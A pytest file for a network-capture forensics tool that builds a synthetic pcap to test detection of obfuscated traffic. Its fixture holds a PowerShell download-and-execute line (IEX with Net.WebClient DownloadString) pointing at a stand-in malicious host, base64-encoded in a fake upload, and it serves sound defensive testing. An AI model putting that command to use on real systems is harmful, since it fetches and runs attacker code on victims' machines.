from __future__ import annotations

import base64
from pathlib import Path

import pytest

from pcapper.obfuscation import analyze_obfuscation
from pcapper.reporting import render_obfuscation_summary


scapy = pytest.importorskip("scapy.all")


def _write_obfuscation_fixture(path: Path) -> None:
    high_entropy_payload = bytes([idx % 256 for idx in range(256)])
    decoded_blob = (
        b"powershell -enc AAAA; "
        b"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a'); "
        b"8.8.8.8"
    )
    b64_blob = base64.b64encode(decoded_blob)

    packets = [
        (
            scapy.Ether(src="aa:bb:cc:dd:ee:01", dst="aa:bb:cc:dd:ee:02")
            / scapy.IP(src="10.0.0.10", dst="10.0.0.20")
            / scapy.TCP(sport=50000, dport=8080, flags="PA")
            / scapy.Raw(load=high_entropy_payload)
        ),
        (
            scapy.Ether(src="aa:bb:cc:dd:ee:01", dst="aa:bb:cc:dd:ee:02")
            / scapy.IP(src="10.0.0.10", dst="10.0.0.20")
            / scapy.TCP(sport=50000, dport=8080, flags="PA")
            / scapy.Raw(load=b"POST /upload HTTP/1.1\r\n\r\n" + b64_blob)
        ),
    ]
    scapy.wrpcap(str(path), packets)


def test_obfuscation_analysis_enriches_ioc_attack_and_session_data(tmp_path: Path) -> None:
    capture = tmp_path / "obf_enriched.pcap"
    _write_obfuscation_fixture(capture)

    summary = analyze_obfuscation(capture, show_status=False)

    assert summary.high_entropy_hits
    assert summary.base64_hits
    assert summary.session_stats
    assert summary.suspicious_packets >= 2
    assert summary.suspicious_sessions >= 1
    assert summary.total_sessions >= summary.suspicious_sessions
    assert summary.ioc_counts
    assert summary.attack_counts
    assert any(key.startswith("url:") for key in summary.ioc_counts.keys())
    assert any("T1059.001" in key for key in summary.attack_counts.keys())
    assert all(hit.reasoning for hit in summary.high_entropy_hits[:1])


def test_obfuscation_render_shows_high_entropy_forensics_details(tmp_path: Path) -> None:
    capture = tmp_path / "obf_render.pcap"
    _write_obfuscation_fixture(capture)
    summary = analyze_obfuscation(capture, show_status=False)

    output = render_obfuscation_summary(summary)

    assert "High-Entropy Samples" in output
    assert "Timerange" in output
    assert "Session Stats" in output
    assert "Recovered Artifacts" in output
    assert "Suspicious Byte Share" in output
